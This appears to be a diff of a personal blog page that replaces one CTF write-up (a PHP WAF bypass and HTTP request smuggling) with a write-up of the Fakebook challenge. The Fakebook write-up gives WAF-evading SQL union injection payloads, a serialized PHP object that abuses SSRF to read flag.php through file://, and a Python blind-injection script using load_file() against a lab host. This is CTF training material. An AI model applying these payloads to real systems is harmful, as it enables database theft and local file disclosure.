@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Yu ting">
   <meta name="keywords" content="">
-  <title>BUUCTF | [RoarCTF 2019]Easy Calc - liquor&#39;s blog</title>
+  <title>BUUCTF[网鼎杯 2018]Fakebook - liquor&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
 
@@ -162,7 +162,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="BUUCTF | [RoarCTF 2019]Easy Calc">
+            <span class="h2" id="subtitle" title="BUUCTF[网鼎杯 2018]Fakebook">
               
             </span>
 
@@ -172,8 +172,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-04-13 21:18" pubdate>
-        April 13, 2021 pm
+      <time datetime="2021-04-16 00:32" pubdate>
+        April 16, 2021 am
       </time>
     </span>
   
@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      565 字
+      644 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      9
        分钟
     </span>
   
@@ -224,42 +224,97 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">BUUCTF | [RoarCTF 2019]Easy Calc</h1>
+            <h1 style="display: none">BUUCTF[网鼎杯 2018]Fakebook</h1>
             
             <div class="markdown-body">
-              <p>感觉这道题目有点意思</p>
-<p>打开网页是个计算机，查源码</p>
-<p><img src="/2021/04/13/buu/2.jpg" srcset="/img/loading.gif" alt="2"></p>
-<h3 id="法一：利用特性"><a class="header-anchor" href="#法一：利用特性">🍭</a>法一：利用特性</h3>
-<p>提示有waf，先测试一下读目录</p>
-<p><img src="/2021/04/13/buu/3.jpg" srcset="/img/loading.gif" alt="3"></p>
-<p>被ban了，应该跟waf有关，这里要利用一个之前没注意过的点：</p>
-<h4 id="PHP的字符串解析特性"><a class="header-anchor" href="#PHP的字符串解析特性">🍭</a>PHP的字符串解析特性</h4>
-<p>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符 2.将某些字符转换为下划线（包括空格）</p>
-<p>我们可以在num前加个空格，这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码能正常运行，还上传了非法字符。构造一个空格即可查目录,但是<code>/</code>过滤掉，此时可用char()转ascii再进行拼接</p>
-<p><img src="/2021/04/13/buu/1.jpg" srcset="/img/loading.gif" alt="1"></p>
-<p>查到flag所在的文件名，列出flag</p>
-<p><img src="/2021/04/13/buu/4.jpg" srcset="/img/loading.gif" alt="4"></p>
-<h3 id="法二-HTTP走私"><a class="header-anchor" href="#法二-HTTP走私">🍭</a>法二:HTTP走私</h3>
-<p>其实用post模式发一个请求，就出现源码</p>
-<p><img src="/2021/04/13/buu/5.jpg" srcset="/img/loading.gif" alt="5"></p>
-<blockquote>
-<p>http走私</p>
-<blockquote>
-<p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
-<p><img src="/2021/04/13/buu/6.jpg" srcset="/img/loading.gif" alt="6"></p>
-<p>详见：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></p>
-</blockquote>
-</blockquote>
-<p>添加<code>Transfer-Encoding: chunked</code>，在消息体加几个回车</p>
-<blockquote>
-<p>分块传输编码（Chunked transfer encoding）是超文本传输协议（HTTP）中的一种数据传输机制，允许HTTP由网页服务器发送给客户端的数据可以分成多个部分。分块传输编码只在HTTP协议1.1版本（HTTP/1.1）中提供</p>
-</blockquote>
-<p>这里用到的是CL-TE：</p>
-<blockquote>
-<p>所谓<code>CL-TE</code>，就是当收到存在两个请求头的请求包时，前端代理服务器只处理<code>Content-Length</code>这一请求头。后端服务器会遵守<code>RFC2616</code>的规定，忽略掉<code>Content-Length</code>，处理<code>Transfer-Encoding</code>这一请求头。</p>
-<p><img src="/2021/04/13/buu/7.jpg" srcset="/img/loading.gif" alt="7"></p>
-</blockquote>
+              <p>这题涉及的知识点比较多。</p>
+<p>查看源码找不到什么有用的信息，扫一下目录</p>
+<p><img src="/2021/04/16/fakebook/1.jpg" srcset="/img/loading.gif" alt="1"></p>
+<p>拿到robots.txt,跟进下载user.php.bak</p>
+<p><img src="/2021/04/16/fakebook/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>SSRF详见：<a href="https://liquor-boop.github.io/2021/02/08/SSRF/">SSRF</a></p>
+<p>随便注册一个用户并查看发现网址有点像SQL注入，用sqlmap跑不出来</p>
+<p><img src="/2021/04/16/fakebook/3.jpg" srcset="/img/loading.gif" alt="3"></p>
+<p>数据型：</p>
+<p><img src="/2021/04/16/fakebook/6.jpg" srcset="/img/loading.gif" alt="6"></p>
+<p>测试列数：</p>
+<p><img src="/2021/04/16/fakebook/4.jpg" srcset="/img/loading.gif" alt="4"></p>
+<p>列数为4,继续测试<code>?no=1 union select 1,2,3,4--+</code>显示no hack,判断存在waf，测试了一下应该是空格过滤掉了</p>
+<p><img src="/2021/04/16/fakebook/7.jpg" srcset="/img/loading.gif" alt="7"></p>
+<p>出现了反序列化函数，本题解法与反序列化相关。</p>
+<p>爆库</p>
+<p><img src="/2021/04/16/fakebook/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<p>爆表</p>
+<p>payload：</p>
+<pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre>
+<p><img src="/2021/04/16/fakebook/9.jpg" srcset="/img/loading.gif" alt="9"></p>
+<p>爆列</p>
+<p>payload</p>
+<pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre>
+<p><img src="/2021/04/16/fakebook/10.jpg" srcset="/img/loading.gif" alt="10"></p>
+<p>爆值</p>
+<pre><code class="hljs sql">?no=-1<span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">group_concat</span>(<span class="hljs-keyword">data</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">users</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><span class="hljs-comment">--+</span></code></pre>
+<p><img src="/2021/04/16/fakebook/11.jpg" srcset="/img/loading.gif" alt="11"></p>
+<p>可以发现在data字段里有我们最开始填的信息的序列化字符串。我们可以将这个链接也序列化<code>file:///var/www/html/flag.php</code>，把flag.php的读取出来。<br>
+序列化</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span>
+<span class="hljs-class"></span>&#123;
+    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">&quot;111&quot;</span>;
+    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">111</span>;
+    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$name, $age, $blog</span>)</span>
+<span class="hljs-function">    </span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;name = $name;
+        <span class="hljs-keyword">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)$age;
+        <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
+    &#125;
+&#125;
+$a = <span class="hljs-keyword">new</span> UserInfo(‘<span class="hljs-number">111</span>‘,<span class="hljs-number">111</span>,‘file:<span class="hljs-comment">///var/www/html/flag.php‘);</span>
+$a = serialize($a);
+<span class="hljs-keyword">echo</span> $a;
+<span class="hljs-comment">//结果:</span>
+O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;111&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">111</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;</code></pre>
+<p>因为data是第四个字段，所以序列化后的字符串所以放在4号位上<br>
+payload</p>
+<pre><code class="hljs rust">?no=-<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span></span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;--+</code></pre>
+<p>查返回页面的源码，得到编码</p>
+<img src="/2021/04/16/fakebook/12.jpg" srcset="/img/loading.gif" alt="12" style="zoom:67%;">
+<p>这道题在网上有另一种非预期解：</p>
+<p>脚本运行：</p>
+<pre><code class="hljs livecodeserver">import requests
+def <span class="hljs-built_in">exp</span>(url_format,<span class="hljs-built_in">length</span>=None):
+    rlt = <span class="hljs-string">&#x27;&#x27;</span>
+    url  = url_format
+    <span class="hljs-keyword">if</span> <span class="hljs-built_in">length</span>==None:
+        <span class="hljs-built_in">length</span> = <span class="hljs-number">50</span>
+    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-built_in">length</span>+<span class="hljs-number">1</span>):
+        begin = <span class="hljs-number">1</span>
+        <span class="hljs-keyword">ends</span> = <span class="hljs-number">126</span>
+        tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2</span>
+        <span class="hljs-keyword">while</span> begin&lt;<span class="hljs-keyword">ends</span>:
+            r = requests.<span class="hljs-built_in">get</span>(url.<span class="hljs-built_in">format</span>(l,tmp))
+            <span class="hljs-comment">#判断条件根据情况修改</span>
+            <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span> <span class="hljs-keyword">in</span> r.content:
+                begin = tmp+<span class="hljs-number">1</span>
+                tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2 </span>
+            <span class="hljs-keyword">else</span>:
+                <span class="hljs-keyword">ends</span> = tmp
+                tmp = (begin+<span class="hljs-keyword">ends</span><span class="hljs-comment">)//2</span>
+        rlt+=chr(tmp)
+        print(rlt)
+    <span class="hljs-literal">return</span> rlt.rstrip()
+url = <span class="hljs-string">&quot;http://812a2fb3-abaa-4b68-98b4-2bc2172d4509.node3.buuoj.cn/view.php?no=elt(ord(substr(load_file(%27/var/www/html/flag.php%27),&#123;&#125;,1))%3E&#123;&#125;,1)&quot;</span>
+<span class="hljs-built_in">exp</span>(url,<span class="hljs-number">400</span>)</code></pre>
+<p><strong>总结：</strong></p>
+<ul>
+<li>通过注入发现data的数据是序列化的</li>
+<li>代码审计存在可利用的ssrf点</li>
+<li>结合反序列化和ssrf，保证bypass可以被利用</li>
+</ul>
+<p>参考：<a target="_blank" rel="noopener" href="http://www.bubuko.com/infodetail-3603593.html">[网鼎杯 2018]Fakebook(SSRF+联合注入绕Waf)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kevinbruce656/p/12643338.html">fakebook题解</a></p>
 
             </div>
             <hr>
@@ -276,9 +331,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/04/15/easytrick/">
+                      <a href="/2021/04/17/lowtype/">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">CISCN2020</span>
+                        <span class="hidden-mobile">PHP弱类型及绕过</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -286,8 +341,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/04/10/wei6/">
-                        <span class="hidden-mobile">sprintf格式化字符串漏洞</span>
+                      <a href="/2021/04/15/easytrick/">
+                        <span class="hidden-mobile">CISCN2020</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
